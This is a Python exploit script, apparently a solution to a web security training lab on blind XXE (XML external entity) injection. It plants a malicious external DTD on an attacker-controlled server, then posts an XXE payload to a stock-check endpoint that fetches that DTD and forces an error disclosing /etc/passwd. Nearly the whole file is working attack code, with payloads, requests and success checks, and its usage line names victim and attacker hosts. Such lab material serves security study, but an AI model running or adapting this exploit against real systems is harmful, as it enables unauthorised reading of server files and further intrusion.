import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def store_dtd(url):
    # XML DTD SCHEMA
    dtd = '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'file:///nonexistant/%file;\'>">%eval;%exfiltrate;'

    # SET PARAMS
    params = {

        'urlIsHttps' : 'on',
        'responseFile' : '/xxe.dtd',
        'responseHead' : 'HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8',
        'responseBody' : dtd,
        'formAction' : 'STORE'
    }

    # SEND REQUEST AND CHECK STATUS
    r = requests.post(url, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Something went wrong while storind the DTD onto the exploit server")
        return False
    return True

def xxe_attack(url1, url2):
    # CRAFT PAYLOAD
    xxe = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{0}/xxe.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'.format(url2)

    params = xxe

    # STOCK URL
    stock_url = url1 + '/product/stock'

    # SEND REQUEST AND CHECK
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    if "root:x:0:0:root:/root:/bin/bash" not in r.text:
        print("[-] The exploit did not work!")
        sys.exit(-1)
    print("[+] Exploit succeeded!")
    print(r.text)

def retrieve_passwd(url1, url2):
    # STORE MALICIOUS DTD ON EXPLOIT SERVER
    store_dtd(url2)

    # SEND PAYLOAD AND EXPLOIT THE XXE VULNERABILITY
    xxe_attack(url1, url2)


def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.victim.com www.attacker.com" % sys.argv[0])
        sys.exit(-1)

    target_url = sys.argv[1].strip()
    exploit_url = sys.argv[2].strip()

    print("[+] Lab: Exploiting blind XXE to retrieve data via error messages")
    print("""[+] This lab has a "Check stock" feature that parses XML input but does not display the result.
    To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.""")

    retrieve_passwd(target_url, exploit_url)

if __name__ == "__main__":
    main()